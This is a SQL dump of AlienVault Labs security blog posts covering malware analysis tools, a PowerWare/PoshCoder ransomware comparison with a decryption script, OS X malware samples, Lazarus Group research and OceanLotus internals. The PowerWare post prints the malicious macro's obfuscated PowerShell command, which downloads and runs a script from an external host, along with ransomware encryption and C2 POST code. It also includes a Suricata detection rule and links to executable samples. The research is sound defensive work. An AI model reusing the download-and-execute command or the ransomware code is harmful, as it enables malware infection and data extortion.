pushes all of the registers to stack. You can use this debugger to step through the execution of the sample to see the unpacked sample in memory. You can continue analyzing the samples step-by-step and use the debuggers in the tool for finding the malware\'s activities and the effects it has on the system.Here’s Immunity Debugger:For capturing network traffic, we use Wireshark or TCPDump.For monitoring the activity on the system, we use system monitor and Regshot.Sandboxes are another important step in reverse engineering malware, as often there are functionalities malware doesn\'t exhibit unless it is running in a suitable environment. One sandbox, malwr, comes from the people who built Cuckoo Sandbox. With malwr, you submit a sample and run it inside a VM. You can then run various dynamic analysis tools and static analysis tools referenced above and turn this into a nice, readable report.Here is malwr:Another Sandbox that is relatively new is Hybrid-Analysis. It is made by Payload Security and it functions very similar to malwr, but they have some of their own custom sandboxes running that may or may not be based on Cuckoo.Here is Hybrid-Analysis:Another major Sandbox tool for identifying malware is VirusTotal. VirusTotal is owned by Google, and they arguably have the biggest repository of both malware and known file types in general layout. If you are looking for any particular malware, it typically shows up in VirusTotal.Here is VirusTotal:Another new contender is DeepViz. DeepViz is being developed very actively, with new features on a regular basis. DeepViz functions very similarly to other Sandboxes, but sometimes it is beneficial to submit the same sample to multiple sandboxes to see if the behavior matches up or if it reacts differently.Here is DeepViz:Which brings us to Cuckoo. Cuckoo is a malware analysis system. It contains many different tools, including some of the dynamic and static analysis tools that we mentioned earlier. Also, it is free. While other sandboxes are free, you are sharing your data by using them. If you set up Cuckoo on your own system you can keep everything localized and keep it to yourself, especially if you are analyzing something you don\'t want the world to know about yet.Here is Cuckoo:\n\nOpen Threat Exchange (OTX) is another key component we use in malware analysis.To find out more about OTX there is a documentation center. You can also see information on our forums. There is a section specifically for OTX where you can see pulses. Also, just a few weeks ago we announced some enhancements to the OTX API. If you are a blogger, please note you can now embed pulses. So if you write a blog, you can just simply embed it within so users can read it and directly download the IoCs and other information. Read more.Connecting OTX to your USM platform helps you to manage risk better and effectively take action on threats. A free trial of AlienVault USM is available.', 'malwarereverse engineeringmalware research', '/blogs/labs-research/reverse-engineering-malware');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (28, 'PowerWare or PoshCoder? Comparison and Decryption', 'Peter Ewane', 'April 4, 2016 ', 'PowerWare was brought to my attention by Carbon Black via their blog post. PowerWare is downloaded by a malicious macro-enabled Microsoft Word document that is distributed via a phishing email campaign. The malicious document in question attempts to convince the user to enable macros by informing them that the file is protected by Microsoft Office. This, of course, is a farce. Once the macro is enabled, the PowerWare payload will be downloaded and executed. PowerWare, unfortunately, is hitting healthcare providers.\nFigure 1: Screenshot of the macro-enabled malicious Microsoft Word document tricking the user into enabling macrosUsing olevba.py from oletools, we can extract the macro from the aforementioned document for analysis.Private Sub Document_Open()\n\nDim CGJKIYRSDGHJHGFFG As String\n\nCGJKIYRSDGHJHGFFG = \"cmd /K \" + \"pow\" + \"eR\" & \"sh\" + \"ell.e\" + \"x\" + \"e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile(\'http://skycpa[.]in/file.php\',\'%TEMP%\\Y.ps1\'); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\\Y.ps1\"\n\nShell CGJKIYRSDGHJHGFFG, 0\n\nMsgBox (\"Unreferenced library required\")\n\nEnd SubFrom the output above, we can see when enabled, the macro intends to run this PowerShell command:\"cmd /K \" + \"pow\" + \"eR\" & \"sh\" + \"ell.e\" + \"x\" + \"e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile(\'http://skycpa.in/file[.]php\',\'%TEMP%\\Y.ps1\'); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\\Y.ps1”It employs use of “cmd” to launch “Powershell.exe,” because on some systems, calling the executable directly is blocked. The command also includes some minor obfuscation, such as splitting PowerShell.exe into bit sized chunks and mixing upper and lower case. In addition, the command attempts to bypass the Execution Policy and not use any profiles the system may have set to be used by default. It then downloads the payload form syscpa[.]in to a temporary directory as Y.ps1 and then executes it.PowerWare based on PoshCoderUpon examination of the PowerShell file that was downloaded, you may notice that the programming logic looks familiar. PowerWare seems to be heavily based on PoshCoder, the ransomware that rose to infamy due to the fact it destroyed encrypted data using a logic based programming flaw. The programming style and flow is similar enough that some may even argue that it\'s a variant of PoshCoder and not a totally new PowerShell ransomware family. The following are some of their major similarities:1. Both incorporate the use of the RijndaelManaged class. The use of that class itself is not uncommon. However, if you examine the usage of the class, you will notice that the two are quite similar from the key initialization to the padding and mode choice. The exception is their Initialization vector (IV).Excerpt from PoshCoder Sample$XlowQsiRsKORgfR = new-Object System.Security.Cryptography.RijndaelManaged\n$XlowQsiRsKORgfR.Key = (new-Object Security.Cryptography.Rfc2898DeriveBytes $BchjdRgasjcThsjd, $UxjcRgasjfvRsj, 5).GetBytes(32)\n$XlowQsiRsKORgfR.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes(\"XlowQsiRsKORgfRjBMPLmCamEMyFRlWfsgTgh\") )[0..15]\n$XlowQsiRsKORgfR.Padding=\"Zeros\"\n$XlowQsiRsKORgfR.Mode=\"CBC\"Excerpt from PowerWareBnx8Khahs3Hjx96 = new-Object System.Security.Cryptography.RijndaelManaged\n$Bnx8Khahs3Hjx96.Key = (new-Object Security.Cryptography.Rfc2898DeriveBytes $GBCSWHJKIYRDVHH, $VGHKJJGFERHJJGSDQWD, 5).GetBytes(32)\n$Bnx8Khahs3Hjx96.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes(\"alle\") )[0..15]\n$Bnx8Khahs3Hjx96.Padding=\"Zeros\"\n$Bnx8Khahs3Hjx96.Mode=\"CBC\"2. If you count the number file types that they encrypt, not shown for space reasons, you get 451 file types. Of these 451, most are found in both samples with the exception of five types, \"*.amf\", \"*.qtiq\", \"*.srf\", \"*.val\" and \"*.waw\". That works out to be slightly less than 1% difference in their two lists.That being said the two samples are not exact copies of each other, there are some differences in their codebases as you will see below:PoshCoder features hardcoded values utilized to encrypt files. PowerWare, on the other hand, employs the Get-Random Cmdlet (https://technet.microsoft.com/en-us/library/ff730929.aspx) to randomly generate values needed to create the password and salt for RijndaelManaged.Excerpt from PowerWare$GBCSWHJKIYRDVHH = ([ChaR[]](GeT-RandOm -Input $(48..57 + 65..90 + 97..122) -Count 50)) -join \"\" \n$SGKPOTTHJMNFDRYJKJ = ([ChaR[]](GeT-RandOm -Input $(48..57 + 65..90 + 97..122) -Count 20)) -join \"\"\n$SQEGJJYRFBNHFFHJ = ([ChaR[]](GeT-RandOm -Input $(48..57 + 65..90 + 97..122) -Count 25)) -join \"\"PoshCoder did not include any sort of network communication capability. It transmits the randomly generated values to a remote server via a POST request in plain HTTP utilizing XMLHTTP.$73848HhjhdRghx67Hhsh = New-Object -ComObject MsXml2.XMLHTTP\n$73848HhjhdRghx67Hhsh.open(\'POST\', $XCJHEDIJGDFJMVD, $false)\n$73848HhjhdRghx67Hhsh.setRequestHeader(\"C\"+\"ontent-tYpe\",\n\"apPlicAtion/x-www-form-url\"+\"enCodeD\")\n$73848HhjhdRghx67Hhsh.setRequestHeader(\"ConteNt-length\", $post.length)\n$73848HhjhdRghx67Hhsh.setRequestHeader(\"CoNNeCtion\", \"close\")\n$73848HhjhdRghx67Hhsh.send($HGJHBVSRYUJNBGDRHJ)3. PoshCoder variants featured some bad programming that made some files unrecoverable. Specifically, the script indicates that any file less than 42871 bytes in size will be encrypted completely but the larger files will only have the first 42871 bytes encrypted. That was an issue because the encryption will read in the first 42871 bytes from the file, encrypt them and then add 16 bytes of padding to reach the next boundary. Due to the padding, the overwritten bytes from 42872 to 42880 cannot be recovered. There was also the issue of the AES key not being properly padded when it was converted into a base64 string, so when decoded the variable would contain NULL or an empty value. Luckily, PowerWare doesn’t seem to have the these issues, and the files are recoverable.Decrypting PowerWareAs mentioned earlier, PowerWare transmits randomly generated values to a remote server in clear-text via a POST request using XMLHTTP. This makes the traffic easily decipherable by AlienVault USM, or another NIDS with a proper Suricata rule such as the one below:alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"AV TROJAN Ransomware PowerWare/Poshcoder CnC Checkin\"; flow:established,to_server; content:\"POST\"; http_method; content:\"Content-Type|3a| application/x-www-form-urlencoded\"; http_header; nocase; content:\".php\"; http_uri; content:\"string=\"; http_client_body; nocase; content:\"&string2=\"; http_client_body; nocase; content:\"&uuid=\"; http_client_body; nocase; reference:md5,4564d49eda7a048f301b1f87f9da3c62; classtype:trojan-activity; sid:12345678; rev:1;)Which would, in theory, capture the traffic below:To decrypt the files we need two things:The password used during encryption (string)The salt used during the encryption process (string2).Using the values above for \"string\" and \"string2\" we can decrypt the files encrypted by PowerWare.param([string]$filename = $(Throw \"Argument \'filename\' required.\"), [string]$string1 = $(Throw \"Please enter \'string\'.\"),[string]$string2 = $(Throw \"Please enter \'string2\'.\"))\nwrite-host \"The entered filename is: $filename\"\nwrite-host \"The entered Password is: $string1\"\nwrite-host \"The entered Salt is: $string2\"\n\n$salt = [Text.Encoding]::UTF8.GetBytes($string2)\n\n$Rijndael = new-Object System.Security.Cryptography.RijndaelManaged\n$Rijndael.Key = (new-Object Security.Cryptography.Rfc2898DeriveBytes $string1, $salt, 5).GetBytes(32)\n$Rijndael.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes(\"alle\") )[0..15]\n$Rijndael.Padding=\"Zeros\"\n$Rijndael.Mode=\"CBC\"\n\ntry{\n\n  $binReader = New-Object System.IO.BinaryReader([System.IO.File]::Open($filename, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Read),[System.Text.Encoding]::ASCII)\n  if ($binReader.BaseStream.Length -lt 2048){\n    $binReader_length = $binReader.BaseStream.Length\n  }\n  else\n  {\n    $binReader_length = 2048\n  }\n\n  $data = $binReader.ReadBytes($binReader_length)\n\n  $binReader.Close()\n  $The_Decryptor = $Rijndael.CreateDecryptor()\n  $memStream = new-Object IO.MemoryStream\n  $cryptoStream = new-Object Security.Cryptography.CryptoStream $memStream,$The_Decryptor,\"Write\"\n  $cryptoStream.Write($data, 0,$data.Length)\n  $cryptoStream.Close()\n  $memStream.Close()\n  $The_Decryptor.Clear()\n  $memStream_Array = $memStream.ToArray()\n  $binWriter = New-Object System.IO.BinaryWriter([System.IO.File]::Open($filename, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Read),[System.Text.Encoding]::ASCII)\n\n  $binWriter.Write($memStream_Array,0,$memStream_Array.Length)\n\n  $binWriter.Close()\n}\ncatch\n{\n    write-host \"Someting broke, set debuggers to level 10\"\n}Samples Analyzed:4564d49eda7a048f301b1f87f9da3c62 - PowerWare627e107a62bdf541ffcfaa045fe9ba32 - PoshCoder/PoshKoder9fe45fc4c402932248cd2c26b65f883d - PoshCoder/PoshKoderbe03eb109cab04a1a70b5bbc7b22949e - PoshCoder/PoshKoderd09cef5f16b1e5813a25fef43474ac96 - PoshCoder/PoshKoderConclusionPowerWare, while it appears to be new, is heavily based on PoshCoder. More research is required, but this finding will hopefully assist security researchers in their efforts.', 'ransomwarepowerwareposhcoder', '/blogs/labs-research/powerware-or-poshcoder-comparison-and-decryption');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (29, 'OS X Malware Samples Analyzed', 'AlienVault Labs', 'March 21, 2016 ', 'By Eddie Lee and Krishna KonaA couple of months ago, as we rang in 2016, we thought it would be interesting to take a quick look back at some OSX malware from 2015 and 2014. As reported by the team at Bit9+Carbon Black [1], 2015 marked “the most prolific year in history for OS X malware”. We collected a few samples of malware named in that report, along with some samples of other notable OSX malware, with the intention of learning more about them and fill in any gaps in our detection mechanisms (NIDS and Correlation rules). Although our primary objective was to capture network traffic from the malware samples, we were also interested in other aspects of the malware like persistence mechanisms (if any) that they utilized, so we documented that activity as well.To start off with, we reviewed Flashback, one of the most infamous pieces of OS X malware that reminded everyone to the fact that OS X is not immune to malware. After that, we played with KitM, which is spyware, and LaoShu, a RAT. Then we analyzed Mask, a sophisticated malware that was used for cyber espionage. We also looked into CoinThief malware that steals bitcoins from the infected machine and the WireLurker malware that is capable of infecting iPhone devices connected to the compromised machine. Finally, we analyzed OceanLotus that was discovered May last year and found to be attacking Chinese government infrastructure. Below is a summary of our findings from analyzing the samples in a sandbox – the findings include links to fully executable samples, IDS signatures, persistence mechanisms and C&C details.OS X Malware DetailsFlashbackDescription: Flashback masquerades as Adobe Flash player update or a signed-java applet. Downloads/installs Web Traffic Interception component to inject ads into HTTP/HTTPS streams http://go.eset.com/us/resources/white-papers/osx_flashback.pdf [no longer available].Sample: https://www.virustotal.com/en/file/58029f84c3826a0bd2757d2fe7405611b75ffc2094a80606662919dae68f946e/analysis/Persistence mechanism: Installs a malicious file in user\'s home directory with the filename starting with a ‘dot\' to hide itself and installs a LaunchAgent in ~/Library/LaunchAgents to refer to the created malicious file.C&C communication: Uses DGA for CnC domain names and twitter hashtags to decode the address of CnC server.AlienVault Detections:IDSExisting SIDs: 2014596, 2014597, 2014598, 2014599, 2014534, 2014522, 2014523, 2014524, 2014525System Compromise, Trojan infection, FlashbackKumar in the Mac (KitM)Description: KitM is a signed malware that can take screenshots, download and install programs, and steal data [5].Sample: https://www.virustotal.com/en/file/07062d9ecb16bd3a4ea00d434f469fe63d5c1c95d1b4903705de31353e9c92ce/analysis/Persistence mechanism: Adds a Login Item at ~/Library/Preferences/com.apple.loginitems.plistC&C server: liveapple[dot]eu (down)AlienVault Detections:IDS rules: https://github.com/AlienVault-Labs/AlienVaultLabs/blob/master/malware_analysis/OSX_Malware/snort_kitm.rulesSystem Compromise, Trojan infection, KitMLaoShuDescription: LaoShu is a data stealing RAT. It has functionality to search for files, ex-filtrate files, download new file, and execute arbitrary commands [6].Sample: https://www.virustotal.com/en/file/5443ad1db119b599232b91bbf0ac3d0e1e4f4894f7f4ba191e7b9f7a27acea0d/analysis/Persistence mechanism: NoneC&C server: floracrunch[dot]com (down)AlienVault Detections:IDS rules: https://github.com/AlienVault-Labs/AlienVaultLabs/blob/master/malware_analysis/OSX_Malware/snort_laoshu.rules System Compromise, Trojan infection, LaoShuAppetite/Mask-CaretoDescription: This is a state-of-the-art malware with Windows, Mac OS and Linux variants. The OS X variant uses a backdoor based on the open source Shadowinteger\'s Backdoor (SBD) [7].Sample: https://www.virustotal.com/en/file/0710be16ba8a36712c3cac21776c8846e29897300271f09ba0a41983e370e1a0/analysis/ (Verified executability: tries to connect to itunes212[dot]appleupdt[dot]com)Persistence mechanism: Installs a LaunchAgent at Library/LaunchAgents/com.apple.launchport.plist and references a malicious binary in /Applications/.DS_Store.appC&C servers:itunes212[dot]appleupdt[dot]comitunes214[dot]appleupdt[dot]comitunes311[dot]appleupdt[dot]com(As of Feb 6, 2014, the above C&C domains have been suspended by Apple.)AlienVault Detections:IDSExisting SIDs: 2021712, 2021714, 2021715New rules: https://github.com/AlienVault-Labs/AlienVaultLabs/blob/master/malware_analysis/OSX_Malware/snort_careto.rulesSystem Compromise, Targeted Malware, CaretoCoinThiefDescription: CoinThief installs browser extensions to steal credentials to popular Bitcoin wallet sites [8].Sample: https://www.virustotal.com/en/file/7d5eff5f83ab79e5f75acb9b84138561c8fd63ba00c050699c9f5be29d342f6e/analysis/Persistence mechanism: Installs a LaunchAgent and browser extensions.The LaunchAgent is installed at ~/Library/LaunchAgents/com.google.softwareUpdateAgent.plist and references a malicious binary at ~/Library/Application Support/.com.google.softwareUpdateAgent/com.google.softwareUpdateAgent.A Safari extensions is installed at ~/Library/Safari/Extensions/Pop-Up Blocker.safariextz.A Chrome extensions is installed at ~/Library/Application Support/Google/Chrome/Default/DefaultApps/noehjlabkmejilomimnebjkdjaoomabh/1.0.0_0.C&C server: www[dot]media02-cloudfront[dot]com (down)AlienVault Detections:IDS rules: https://github.com/AlienVault-Labs/AlienVaultLabs/blob/master/malware_analysis/OSX_Malware/snort_cointhief.rulesSystem Compromise, Trojan infection, CoinThiefWireLurkerDescription: WireLurker monitors an infected system for a USB connection to an iOS device and installs malicious applications on the device [9].Sample: https://www.virustotal.com/en/file/5d4f4fb2a663f1f79fb96edcd832374304af877938747b5844daacf4beba2427/analysis/Persistence mechanism:Installs LaunchDaemons/System/Library/LaunchDaemons/com.apple.MailServiceAgentHelper.plist/System/Library/LaunchDaemons/com.apple.appstore.plughelper.plist/System/Library/LaunchDaemons/com.apple.periodic-dd-mm-yy.plist/System/Library/LaunchDaemons/com.apple.systemkeychain-helper.plistC&C servers: www[dot]comeinbaby[dot]com (down)AlienVault Detections:IDSExisting SIDs: 2019660, 2019661, 2019662, 2019663, 2019664, 2019665, 2019666, 2019667, 2019731, 2019718System Compromise, Malware infection, WireLurkerSystem Compromise, Mobile trojan infection, WireLurkerOceanLotusDescription: OceanLotus is malware that has been used against Chinese targets and essentially gives attackers full control over a compromised machine [10] [11].Sample: https://www.virustotal.com/en/file/83cd03d4190ad7dd122de96d2cc1e29642ffc34c2a836dbc0e1b03e3b3b55cff/analysis/Persistence mechanism: Installs a LaunchAgent at ~/Library/LaunchAgents/com.google.plugins.plist and references a malicious binary at ~/Library/Logs/.Logs/corevideosdC&C servers:kiifd[dot]pozon7[dot]netshop[dot]ownpro[dot]netpad[dot]werzo[dot]netAlienVault Detections:IDS rules: https://github.com/AlienVault-Labs/AlienVaultLabs/blob/master/malware_analysis/OSX_Malware/snort_oceanlotus.rules System Compromise, Targeted Malware, OceanLotusPersistence MechanismsThe samples we looked at used well known [2] persistence mechanisms and were not difficult to detect. Specifically, the samples that we looked at use the following persistence mechanisms: launch agents, launch daemons, login items, and browser extensions. For those that aren\'t familiar with how these mechanisms are used, below is a short summary.Launch daemons: These are start-up programs that run when the system first boots up.Items in /Library/LaunchDaemons and /System/Library/LaunchDaemons load when OSX starts up, and run as the root user.Launch agents: These are start-up programs that are executed on a per-user basis.Items in /Library/LaunchAgents and /System/Library/LaunchAgents load when any user logs in, and run as that user.Items in ~/Library/LaunchAgents load only when that particular user logs in, and run as that user.Login itemsThese programs are run at the end of the login process and can be found in ~/Library/Preferences/com.apple.loginitems.plist. The login items can be viewed in System Preferences -> Users & Groups -> [User Name] -> Login ItemsBrowser extensionsThese are plugins that are loaded when a user starts a web browser such as Safari, Chrome, Firefox or Opera. These plugins are often used to monitor browser activity and steal sensitive information such as login credentials. Although the samples we looked at used browser extensions, malicious plugins are not limited to browsers – malicious plugins can be added to a variety of applications that support plugins.OTX StatsIn addition to gathering samples, we also took a look at some statistics from Open Threat Exchange (OTX). The top 3 offenders that we saw in that data were:OSX/Flashback User-Agent (49.5%)OSX ADWARE/Mackeeper (26.6%)OSX/WireLurker (23.7%)This represents slightly over 20k events and includes only data prior to us enhancing our detection capabilities, so it doesn\'t include hits for OceanLotus, LaoShu, CoinThief, or KitM.The following pulses from Open Threat Exchange (OTX) are related to the samples we examined:LaoShu: https://otx.alienvault.com/pulse/568da8bc4637f2624bcdc2d1/KitM: https://otx.alienvault.com/pulse/568da7e467db8c057c6fc696/CoinThief: https://otx.alienvault.com/pulse/568da51b67db8c057c6fc689/WireLurker: https://otx.alienvault.com/pulse/55d4c6dc67db8c37b0a358ea/Mask/Careto: https://otx.alienvault.com/pulse/5531bbbfb45ff53dc229c806/ObservationsWe found this exercise to be quite useful as it allowed us to get better acquainted with the behavior of the above malware and we were indeed able to improve our detection capabilities. Part of the process was to obtain fully functional OSX malware samples, but we found that can sometimes be difficult since many samples on VirusTotal are stand-alone executables rather than full \'.app\' bundles. Hopefully, we have made it a little easier for you to perform your own analysis by including links to fully executable samples.Although this was an interesting exercise, we noted that most of the C&C servers have been taken offline, so the risk associated with these samples is not high. However, any signs of activity from these samples could be an indication of a deeper compromise so they should not be summarily dismissed.Looking AheadApple is making strong inroads in the corporate space. Apple\'s rising market share is making it lucrative for malware authors to write more OSX malware. In the Silicon Valley (where we are headquartered), many startups offer Macbooks as the default laptop when onboarding new hires. Therefore, it should come as no surprise that as the adoption of OSX increases, so will the prevalence of OSX-based malware. Furthermore, 2015 has been a tremendous year for OSX-based vulnerability disclosure [3]. As the number of known vulnerabilities increase, we expect more malware will take advantage of those flaws.References:https://www.carbonblack.com/files/2015-the-most-prolific-year-for-os-x-malware/https://www.virusbtn.com/pdf/conference/vb2014/VB2014-Wardle.pdfhttp://www.cvedetails.com/product/156/Apple-Mac-Os-X.html?vendor_id=49https://www.f-secure.com/weblog/archives/00002558.htmlhttps://nakedsecurity.sophos.com/2014/01/21/data-stealing-malware-targets-mac-users-in-undelivered-courier-item-attack/http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdfhttp://www.securemac.com/privacyscan/new-apple-mac-trojan-called-osxcointhief-discoveredhttps://www.paloaltonetworks.com/content/dam/paloaltonetworks-com/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdfhttps://www.alienvault.com/open-threat-exchange/blog/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-updatehttp://www.thesafemac.com/oceanlotus-malware-attacks-china/', 'malwareosx', '/blogs/labs-research/os-x-malware-samples-analyzed');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (30, 'Operation BlockBuster unveils the actors behind the Sony attacks', 'Jaime Blasco', 'February 24, 2016 ', 'Today, a coordinated coalition involving AlienVault and several other security companies led by Novetta is announcing Operation BlockBuster. This industry initiative was created to share information and potentially disrupt the infrastructure and tools from an actor named the Lazarus Group. The Lazarus Group has been responsible for several operations since at least 2009, including the attack that affected Sony Pictures Entertainment in 2014.Part of our research on this actor was presented at the Kaspersky Security Analyst Summit (SAS) in Tenerife, Spain on February 9th, 2016 as a joint talk between AlienVault and Kaspersky’s Global Research and Analysis Team.In the research that AlienVault and Kaspersky collaborated on, we attributed several campaigns to this actor. Armed with some of the indicators that US-CERT made public after the Sony attack, we continued to analyze different campaigns in 2015 that we suspected were being launched by the same actor. Eventually we were also able to attribute previous activity to the same attackers including:Sony Pictures Entertainment - 2014Operation DarkSeoul - 2013Operation Troy - 2013Wild Positron / Duuzer - 2015Besides several campaigns were the Lazarus group has utilized wipers to perform destructive attacks, they have also been busy using the same tools to perform data theft and cyber espionage operations.Today, as part of the Operation BlockBuster release, we want to share some of our findings and TTP’s from the Lazarus Group that allowed us to link and attribute all the campaigns and tools into the same cluster of activity. We highly recommend that you read the comprehensive report Novetta published today http://operationblockbuster.com [no longer available] that includes details on the project’s scope and the more than 45 malware families identified, and includes signatures and guidance to help organizations detect and stop the group’s actions.Encryption/Shared keysOne of the key findings that gave us the opportunity to link several families to the same actors was finding a dropper that the attackers use. This dropper contains a compressed resource (ZIP) with the name “MYRES” that is protected by a password. The attackers have reused the same password in different occasions and we were able to find droppers containing different families used by the group.This actor also reuses the code libraries they utilize to perform RSA encryption. We were also able to find the exact same public key in multiple variants.Batch scriptsThis actor often uses BAT files that share the same skeleton in order to delete the initial files after infection.We have seem them reuse this technique across multiple droppers and payloads.Obfuscation functionsThe Lazarus Group uses a few different methods to obfuscate API functions and dynamically load them. One of them consist on using a simple XOR schema.\nYou can find other examples of API function obfuscation in the Novetta http://operationblockbuster.com [no loner available] report.Network communicationsThis actor has different malware families in their toolset that implement a similar C&C protocol. The protocol looks like TLS but it is in fact a “fake” TLS protocol that mimics it.One of the characteristics we have identified is how they choose the values for certain fields when generating “TLS” packets, especially the ClientHello packet.We have identified different families exhibiting slightly different behaviors:Using a static “Server Name” extension in the client_hello packet: “[email protected]#$%^&*()”Choosing between “www.amazon.com” and “www.google.com” for the “Server Name” value.Randomly choosing one of the following items for the “Server Name” value (this list can vary across different samples):wwwimages2.adobe.comwww.paypalobjects.comwww.paypal.comwww.linkedin.comwww.apple.comwww.amazon.comwww.adobetag.comwindowslive.tt.omtrdc.netverify.adobe.comus.bc.yahoo.comurs.microsoft.comsupportprofile.apple.comsupport.oracle.comsupport.msn.comstartpage.comsstats.adobe.comssl.gstatic.comssl.google-analytics.comsrv.main.ebayrtm.comskydrive.live.comsignin.ebay.comsecuremetrics.apple.comsecureir.ebaystatic.comsecure.skypeassets.comsecure.skype.comsecure.shared.live.comsecure.logmein.comsc.imp.live.comsb.scorecardresearch.coms1-s.licdn.coms.imp.microsoft.compixel.quantserve.comp.sfx.msmpsnare.iesnare.comlogin.yahoo.comlogin.skype.comlogin.postini.comlogin.live.coml.betrad.comimages-na.ssl-images-amazon.comfls-na.amazon.comextended-validation-ssl.verisign.comdaw.apple.comcsc.beap.bc.yahoo.comby.essl.optimost.comb.stats.ebay.comapps.skypeassets.comapi.demandbase.comad.naver.com\naccounts.google.comOn the other hand, most of the samples we have analyzed communicate with IP addresses that are part of compromised infrastructure. Since the attackers don’t leverage domain names for C2 it makes it hard to pivot using whois data, and passive DNS. In addition, there is no way to sinkhole since there is no domain infrastructure.Another example is the use of user-agent values that contain the misspelled “Mozillar” string.Hangul HWP Document ExploitsHangul is an office suite and word processing application mainly used in South Korea, especially in the government.We have observed this actor launching spearphishing campaigns with malicious HWP documents as attachments.An example is a campaign that was launched on September 2015 that used a zeroday vulnerability (CVE-2015-6585) in the Hangul Word processor which was reported by FireEye.Based on obtained samples and decoy documents we observed that they were likely targeting a wide range of victims including government, industrial and political entities.\nSample decoy documentsFake installersIt appears another vector the Lazarus Group uses to infect victims is distributing backdoored software. We have found a few samples using this technique but it is not quite clear to us how they were distributing the files.An example is a backdoored version of a Remote Desktop Client:\nIndicators of CompromiseAs part of Operation BlockBuster, Novetta is sharing Yara rules and IOC’s that you can find at the following website:Operation BlockBuster http://www.operationblockbuster.com/resources/index.html [no longer available]In addition to that we are making the indicators of compromise available in our Open Threat Exchange:https://otx.alienvault.com/pulse/56cdb68f4637f27567167dce/', '', '/blogs/labs-research/operation-blockbuster-unveils-the-actors-behind-the-sony-attacks');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (31, 'OceanLotus for OS X â an Application Bundle Pretending to be an Adobe Flash Update', 'Eddie Lee', 'February 17, 2016 ', 'In May 2015, researchers at Qihoo 360 published a report on OceanLotus that included details about malware targeting Chinese infrastructure. In that report, there is a description about a piece of malware that targets OS X systems. A sample of that malware was uploaded to VirusTotal a few months ago. Curiously, as of February 8th, 2016, none of the 55 anti-virus solutions used by VirusTotal are detecting the sample as malicious. As such, we thought it would be interesting to take a closer look at the OS X version of OceanLotus.AnalysisOceanLotus for OS X is packaged as an application bundle pretending to be an Adobe Flash update. Although there are other files in the bundle, the files of interest are:FlashUpdate.app/Contents/MacOS/EmptyApplicationFlashUpdate.app/Contents/Resources/en.lproj/.en_iconFlashUpdate.app/Contents/Resources/en.lproj/.DS_StoresThe LoaderAs you can see below, EmptyApplication is a universal binary that can run on both i386 and x86_64 architectures. It is a fairly simple program that ROL3 decodes the \"hidden\" files .en_icon and .DS_Stores then executes them.$file EmptyApplication\nEmptyApplication: Mach-O universal binary with 2 architectures\nEmptyApplication (for architecture x86_64): Mach-O 64-bit executable x86_64\nEmptyApplication (for architecture i386): Mach-O executable i386For obfuscation, EmptyApplication uses XOR encryption with the key \"xc\" to obfuscate strings within the binary. Below is the simple decryption function.In the 64-bit version, strings shorter than 8 bytes are stored as integer values. Encrypted strings longer than 8 bytes are stored in adjacent variables and the decrypting function reads past the variable\'s 8 byte boundary. As you can see below, &v34 is passed to the decrypting function, but the function actually decrypts the combination of v34 and v35.After decoding .en_icon, EmptyApplication writes it to a temporary directory with the name \"pboard\" (presumably to mimic the OS X paste board daemon) and executes the binary. EmptyApplication then deletes itself, decodes .DS_Stores, and writes the decoded binary as \"EmptyApplication\" – replacing the original EmptyApplication executable. Finally, the new EmptyApplication is relaunched with a call to NSTask.launch(). The decrypted .DS_Stores binary does almost the same thing as the original EmptyApplication, except it does not look for .DS_Stores.The TrojanEncrypted StringsThe decoded .en_icon file is the main Trojan. It has anti-debugging capabilities and handles the connection to the command and control servers. As we\'ll discuss later, the Trojan takes advantage of several OS X specific commands and API calls, so it\'s clear that this Trojan was tailor-made for OS X rather than a port from another operating system.Again, most strings in the binary are XOR encrypted but this binary uses multiple keys and the keys themselves are XOR encrypted. In fact, the first thing the Trojan does is to decrypt several XOR keys. It is interesting to note that the code that sets up the decryption keys is executed before the \"main\" entry point by using C++ static constructors. This code is referenced in the __mod_init_func section of mach-o binaries.As you can see from the image above, the primary decryption key used throughout the executable is \"Variable\". However, there are several different instances of the \"Variable\" string, and it would be trivial for the authors to update the code to use different decryption keys through the code. Although XOR decryption is simple by nature, using such a scheme makes reverse engineering a tedious process. Below is the decryption function, which is similar to the function used in EmptyApplication, except this version takes a variable decryption key.Anti-DebuggingTo prevent debuggers from attaching to itself, the Trojan calls ptrace() with the PT_DENY_ATTACH argument. Furthermore, it creates a signal handler to catch SIGTRAPs, calls \"int 3\" to throw a SIGTRAP, sets a flag in the SIGTRAP handler and checks the flag value before it continues to run. This is more of an annoyance than anything novel in terms of anti-debugging.Next, before moving on to the meat of the code, the Trojan performs a signature check on itself by looking at the last 27 bytes of the binary. The first 11 bytes of the 27 bytes must match a hardcoded value in the binary and the final 16 bytes must be the MD5 hash of the binary minus the last 27 bytes.PersistenceThis first real bit of trojan functionality that is performed is to set up a Launch Agent for persistence – the Launch Agent will run every time a user logs in. The Trojan copies itself to ~/Library/Logs/.Logs/corevideosd (or /Library/Logs/.Logs/corevideosd if it has root permissions) and creates a Launch Agent plist at ~/Library/LaunchAgents/com.google.plugins.plist (or /Library/LaunchAgents/com.google.plugins.plist) that references the corevideosd executable.In addition to using \"hidden\" dot 